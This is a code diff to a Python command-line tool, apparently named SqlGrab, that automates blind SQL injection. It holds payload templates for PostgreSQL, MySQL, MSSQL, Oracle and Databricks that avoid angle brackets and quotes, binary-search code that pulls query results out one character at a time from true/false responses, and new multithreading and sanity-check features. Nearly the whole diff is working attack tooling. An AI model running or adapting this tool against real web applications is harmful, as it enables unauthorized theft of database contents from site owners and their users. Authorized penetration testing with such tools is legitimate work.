@@ -1,12 +1,16 @@
+import string
+import threading
 from requests import Request, Session, PreparedRequest
-from typing import Literal
+from typing import Callable, Literal
+from concurrent.futures import ALL_COMPLETED, Future, ThreadPoolExecutor, wait
+from functools import partial
+from http.server import BaseHTTPRequestHandler
+from io import BytesIO
 import time
 import math
 import urllib.parse
 import urllib3
 import argparse
-from http.server import BaseHTTPRequestHandler
-from io import BytesIO
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -31,62 +35,62 @@ INITIAL_CHAR = ord('Z')
 
 POSTGRESQL_PAYLOADS = { # avoids <, > and quotes
     'length': {
-        '>': 'SIGN(LENGTH(({query}))-{{guess}})=1',
-        '=': 'LENGTH(({query}))={{guess}}'
+        '>': 'SIGN(LENGTH(({query}))-{guess})=1',
+        '=': 'LENGTH(({query}))={guess}'
     },
     'character': {
-        '>': 'SIGN(ASCII(SUBSTRING(({query}),{index},1))-{{guess}})=1',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
+        '>': 'SIGN(ASCII(SUBSTRING(({query}),{index},1))-{guess})=1',
+        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
     },
     'compare': '({query})=$${guess}$$'
 }
 
 MYSQL_PAYLOADS = {
     'length': {
-        '>': 'LENGTH(({query}))>{{guess}}',
-        '=': 'LENGTH(({query}))={{guess}}'
+        '>': 'LENGTH(({query}))>{guess}',
+        '=': 'LENGTH(({query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTRING(({query}),{index},1)>CHR({{guess}})',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
+        '>': 'SUBSTRING(({query}),{index},1)>CHR({guess})',
+        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
     },
-    'compare': 'STRCMP(({query}),{{guess}})'
+    'compare': 'STRCMP(({query}),{guess})'
 }
 
 MSSQL_PAYLOADS = {
     'length': {
-        '>': 'LEN(({query}))>{{guess}}',
-        '=': 'LEN(({query}))={{guess}}'
+        '>': 'LEN(({query}))>{guess}',
+        '=': 'LEN(({query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTRING(({query}),{index},1)>CHR({{guess}})',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
+        '>': 'SUBSTRING(({query}),{index},1)>CHR({guess})',
+        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=\'{{guess}}\''
+    'compare': '({query})=\'{guess}\''
 }
 
 ORACLE_PAYLOADS = {
     'length': {
-        '>': 'LENGTH(({query}))>{{guess}}',
-        '=': 'LENGTH(({query}))={{guess}}'
+        '>': 'LENGTH(({query}))>{guess}',
+        '=': 'LENGTH(({query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTR(({query}),{index},1)>CHR({{guess}})',
-        '=': 'SUBSTR(({query}),{index},1)=CHR({{guess}})'
+        '>': 'SUBSTR(({query}),{index},1)>CHR({guess})',
+        '=': 'SUBSTR(({query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=\'{{guess}}\''
+    'compare': '({query})=\'{guess}\''
 }
 
 DATABRICKS_PAYLOADS = {
     'length': {
-        '>': 'length(({query}))>{{guess}}',
-        '=': 'length(({query}))={{guess}}'
+        '>': 'length(({query}))>{guess}',
+        '=': 'length(({query}))={guess}'
     },
     'character': {
-        '>': 'substr(({query}),{index},1)>CHR({{guess}})',
-        '=': 'substr(({query}),{index},1)=CHR({{guess}})'
+        '>': 'substr(({query}),{index},1)>CHR({guess})',
+        '=': 'substr(({query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=\'{{guess}}\''
+    'compare': '({query})=\'{guess}\''
 }
 
 PROFILES = {
@@ -97,12 +101,15 @@ PROFILES = {
     'databricks': DATABRICKS_PAYLOADS
 }
 
+print_lock = threading.Lock()
+
 class SqlGrab:
     def __init__(
             self,
             request: Request,
             dbms: Literal['mysql', 'mssql', 'oracle', 'postgresql', 'databricks'],
             condition: str,
+            threads: int=1,
             delay: float=0,
             urlencode: bool=False,
             sanity: bool=False,
@@ -111,9 +118,10 @@ class SqlGrab:
         ):
         self.request = request
         self.urlencode = urlencode
-        self.sanity = sanity
+        self.sanity_checking = sanity
+        self.threads = threads
         self.delay = delay
-        self.payloadSets = PROFILES[dbms]
+        self.payloads = PROFILES[dbms]
         self.condition = condition
         self.output=output
         self.proxy = {
@@ -129,99 +137,147 @@ class SqlGrab:
             request=cls.parseRequest(host, request),
             **kwargs
         )
+    
+    @staticmethod
+    def _insert_query(payloads: dict, query: str) -> None:
+        for k, v in payloads.items():
+            if type(v) is dict:
+                payloads[k] = SqlGrab._insert_query(v, query=query)
+            elif type(v) is str:
+                payloads[k] = partial(v.format, query=query)
+        return payloads
 
     def grab(self, query: str) -> str:
         if self.output:
             print(f'[+] Grabbing: \'{query}\'')
         self.session = Session()
-        grabber = SqlGrab.Grabber(parent=self, query=query)
+        self.payloads = self._insert_query(
+            payloads=self.payloads,
+            query=query
+        )
         try:
-            # could add parallelism here
-            return grabber.grab()
+            print('[+] \x1B[90mDetermining Length...\x1B[0m', end='\r')
+            length = self._get_length()
+            return self._get_string(length)
         except RuntimeError as e:
             print('\n'+str(e))
             exit()
         except KeyboardInterrupt:
             print('\n[!] Interrupted')
 
-    class Grabber:
-        def __init__(self, parent: 'SqlGrab', query: str):
-            self.parent = parent
-            self.query = query
-            self.result = ''
-            self.status = ''
+    def _done(self, future: Future, payload: str) -> None:
+        self._sanity_check(payload(guess=future.result()))
 
-        def grab(self) -> str:
-            self.length = self.getLength()
-            return self.getString()
+    def _get_string(self, length: int):
+        results: list[tuple[str,bool]] = []
+        print('[+] \x1B[90mDetermining Length...\x1B[0m', end='\r')
+        payloads = self.payloads['character']
+
+        def update(guess: int, index: int, working: bool) -> None:
+            results[index] = (guess, working)
+            output = '[+] '
+            for r in results:
+                value, working = r
+                output += (
+                    f'\x1B[90m-\x1B[0m' if value is None else
+                    f'\x1B[90m{chr(value)}\x1B[0m' if working else
+                    f'\x1b[32m{chr(value)}\x1B[0m'
+                )
+            with print_lock:
+                print(output + '\033[K', end='\r')
+
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures: list[Future] = []
+            for i in range(length):
+                payload = partial(payloads['>'], index=i + 1)
+                results.append((None, True))
+                future = executor.submit(
+                    self.ValueGrabber(
+                        payload=payload,
+                        eval_cb=self.evaluate,
+                        update_cb=update if self.output else None,
+                        update_index=i if self.output else None,
+                        range=(CHAR_MIN, CHAR_MAX)
+                    ).grab,
+                    start=INITIAL_CHAR
+                )
+                if self.sanity_checking:
+                    future.add_done_callback(partial(
+                        self._done, payload=partial(payloads['='], index=i + 1)
+                    ))
+                futures.append(future)
+
+            self.result = ''.join([chr(f.result()) for f in futures])
         
-        def update(self) -> None:
-            if self.parent.output:
-                print(self.status.format(**self.__dict__), end='\r')
+        if self.sanity_checking:
+            self._sanity_check(self.payloads['compare'](guess=self.result))
 
-        # by the time this function is called, the payload string should only require 1 sub
-        def getValue(self, guess: int, bigger: str, equal: str, range=(0, math.inf) ):
+        return self.result
+    
+    def _sanity_check(self, payload: str) -> None:
+        is_equal = self.evaluate(payload)
+        if not is_equal:
+            raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
+
+    def _get_length(self) -> int:
+        payloads = self.payloads['length']
+        length = self.ValueGrabber(
+            payload=payloads['>'],
+            eval_cb=self.evaluate
+        ).grab(start=INITIAL_LENGTH)
+        if self.sanity_checking:
+            self._sanity_check(payloads['='](guess=length))
+        return length
+
+    class ValueGrabber:
+        def __init__(
+                self,
+                payload: Callable,
+                eval_cb: Callable, 
+                update_cb: Callable|None=None,
+                update_index: int|None=None,
+                range: tuple[int,int]=(0,math.inf)
+            ):
+            self.payload = payload
+            self.eval_cb = eval_cb
+            self.update_func = update_cb
+            self.update_index = update_index
+            self.range = range
+            self.working: bool = False
+
+        def grab(self, start: int) -> int:
+            self.guess: int = start
+            self.working = True
+            return self._get_value(self.range)
+
+        def _get_value(self, range=(0, math.inf)) -> int:
             ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
+
             self.min, self.max = range
 
             while self.min != self.max:
-                is_bigger = self.parent.evaluate(bigger.format(guess=guess))
+                is_bigger = self.eval_cb(
+                    self.payload(guess=self.guess)
+                )
                 if is_bigger:
-                    self.min = guess + 1
+                    self.min = self.guess + 1
                 else:
-                    self.max = guess
+                    self.max = self.guess
 
                 if self.max == math.inf: # double value to find upper bound if not already found
-                    guess *= 2
+                    self.guess *= 2
                 else: # narrow down between that range
-                    guess = self.min + int((self.max - self.min) / 2)
-                if guess > 2**32:
+                    self.guess = self.min + int((self.max - self.min) / 2)
+                if self.guess > 2**32:
                     raise RuntimeError('[!] An upper bound on the output length could not be found. Maybe a syntax error?')
                 
-                self.update()
-                time.sleep(self.parent.delay)
+                if self.update_func:
+                    self.update_func(self.guess, self.update_index, self.working)
 
-            # sanity check - this slows us down
-            if self.parent.sanity:
-                is_equal = self.parent.evaluate(equal.format(guess=guess))
-                if not is_equal:
-                    raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
-
-            return guess
-
-        def getLength(self):
-            ''' Determines the length of the query response '''
-            self.status = 'Determining length... (\x1B[90mBetween {min} and {max}\x1B[0m\x1B[0m)\033[K'
-
-            # populate all values in the payload string other than the 'guess' value
-            payloads = self.parent.payloadSets['length']
-            bigger = payloads['>'].format(query=self.query)
-            equal = payloads['='].format(query=self.query)
-
-            return self.getValue(INITIAL_LENGTH, bigger, equal)
-
-        def getString(self) -> str:
-            ''' Determines the value of each character in a [length]-long string '''
-            self.status = '[\x1b[90m{current}/{length}: Between \'{min:c}\' and \'{max:c}\'\x1b[0m] \x1b[32m{result}\x1b[0m\033[K'
-            payloads = self.parent.payloadSets['character']
-
-            for self.current in range(1, self.length + 1):
-                # populate all values in the payload string other than the 'guess' value
-                bigger = payloads['>'].format(query=self.query, index=self.current)
-                equal = payloads['='].format(query=self.query, index=self.current)
-                self.result += chr(
-                    self.getValue(INITIAL_CHAR, bigger, equal, range=(CHAR_MIN, CHAR_MAX))
-                )
-                self.update()
-            
-            # sanity check
-            compare = self.parent.payloadSets['compare'].format(
-                query=self.query,
-                guess=self.result
-            )
-            if not self.parent.evaluate(compare):
-                raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
-            return self.result
+            self.working = False
+            if self.update_func:
+                self.update_func(self.guess, self.update_index, self.working)
+            return self.guess
 
     @staticmethod
     def urlEncode(text: str) -> str:
@@ -263,6 +319,7 @@ class SqlGrab:
             proxies =self.proxy,
             verify=False
         )
+        time.sleep(self.delay)
     
         return self.isMatch(response)
 
@@ -313,9 +370,10 @@ if __name__ == "__main__":
     parser.add_argument('-r', '--request', required=True, help='Request file containing one or more \'{payload}\' tags')
     parser.add_argument('-q', '--query', required=True, help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
     parser.add_argument('-d', '--dbms', required=True, choices=PROFILES.keys())
+    parser.add_argument('-t', '--threads', required=False, default=1, type=int, help='Number of threads, default: 1. Messes with time-based injections.')
     parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\', \'response.elapsed.total_seconds() > 2\'')
     parser.add_argument('--delay', required=False, default=0, type=float, help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
-    parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads.')
+    parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads (payloads in the request\'s path will always be urlencoded).')
     parser.add_argument('--sanity', required=False, action='store_true', help='Sanity check inferred results. Useful to help catch inconsistent results.')
     parser.add_argument('--proxy', required=False, help='Proxy to use, e.g. http://127.0.0.1:8080')
 
@@ -326,4 +384,4 @@ if __name__ == "__main__":
         output=True
     )
     result = grabber.grab(q)
-    print(f'\n{result}\n')
+    print(f'[+] \x1b[32m{result}\x1B[0m')
